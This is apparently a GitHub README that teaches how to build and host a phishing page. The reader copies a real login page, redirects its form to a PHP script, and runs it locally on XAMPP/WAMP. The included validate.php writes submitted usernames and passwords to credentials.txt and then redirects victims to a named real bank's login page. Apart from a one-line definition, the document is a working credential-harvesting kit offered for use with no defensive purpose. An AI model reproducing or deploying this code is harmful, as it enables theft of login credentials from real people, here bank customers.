# phishing


What phishing website does?

Phishing is get sensitive data like passwords, credit card details using fake websites and emails. This is the good example to social 
engineering because this fake website same as the original web site. So user easily caught this unauthorized websites. 



How to host the phishing page on our computer using XAMPP/WAMP ?

1) Open the website in the browser for which you want to create a phishing page. Right click and save as index.html.

![capture1](https://cloud.githubusercontent.com/assets/18233358/24329625/faa91b94-1229-11e7-8c3b-fd3ae79db078.PNG)

2) Then open that html in a note pad. Now search string "action" and change address to validate.php

                   <form action="validate.php" method="post">

3) Now open notepad, type following code in it and save it as validate.php. This is create for store credentials.

                    <?php
                    $username = $_POST["username"];
                    $password = $_POST["passwd"];
 
                    //Get credentials to .txt file
                    $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
                    $txt = "USERNAME = $username , PASSWORD = $password\n";
                    fwrite($myfile, "\n". $txt);
                    fclose($myfile);
 
                    //Redirect the browser to original login page
                    header("Location: https://www.ebank.peoplesbank.lk/eb/index.html");
 
                    exit();

                    ?>

4) Then create credentials.txt file to store these credentials.

5) Host that created files to XAMMP/WAMP.




6) Then run that phishing website on browser and enter credentials.

![capture14](https://cloud.githubusercontent.com/assets/18233358/24329565/f023d058-1227-11e7-9e8e-e1297b9771ea.PNG)

7) That credentials store credentials.txt file. You can view that file and get that credentials easily.








